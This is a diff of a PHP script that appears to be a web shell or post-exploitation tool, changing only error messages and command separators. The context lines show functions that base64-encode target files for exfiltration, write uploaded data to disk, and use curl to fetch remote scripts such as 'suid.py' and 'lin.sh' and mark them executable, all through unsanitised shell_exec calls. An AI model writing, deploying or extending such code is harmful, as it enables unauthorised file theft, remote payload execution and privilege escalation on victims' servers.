@@ -138,10 +138,10 @@ function b64($target, $how, $data, $ext, $dir)
     if (!empty($how) && !empty($target) && !empty($dir)) {
         if (!empty($data) && $how == "up") {
             echo("Starting to decode base64\n");
-            shell_exec("echo " . $data . "| base64 >> " . $dir . "/" . $target . "_backup." . $ext) or die("Error on upload.");
+            shell_exec("echo " . $data . "| base64 >> " . $dir . "/" . $target . "_backup." . $ext) or die("Error on upload.\n");
         } elseif ($how == "down" && !empty($data) && !empty($dir)) {
             echo("Starting base64 encoding\n");
-            shell_exec("base64 -w0 " . $dir . "/" . $target . " >> " . getcwd() . $target . "_backup.b64") or die("Error on building the download.");
+            shell_exec("base64 -w0 " . $dir . "/" . $target . " >> " . getcwd() . $target . "_backup.b64") or die("Error on building the download.\n");
         } else {
             echo("Cannot do what you asked of me.\n");
         }
@@ -209,13 +209,13 @@ function cloner($repo, $os)
         echo("Cloned Repo: \n" . shell_exec("ls -lah"));
     } elseif ($os == "lin") {
         echo("Linux selected");
-        shell_exec("curl " . $linDefault . "-o lin.sh; chmod +x ./lin.sh");
+        shell_exec("curl " . $linDefault . "-o lin.sh && chmod +x ./lin.sh");
     } elseif ($os == "win") {
         echo("Win default selected.");
         shell_exec("curl.exe --output winbat.bat " . $windefault);
     } else {
         echo("assuming linux, since it was not specified.");
-        shell_exec("curl " . $repos["default"] . " -o suid.py; chmod +x suid.py");
+        shell_exec("curl " . $repos["default"] . " -o suid.py && chmod +x suid.py");
     }
 }
 
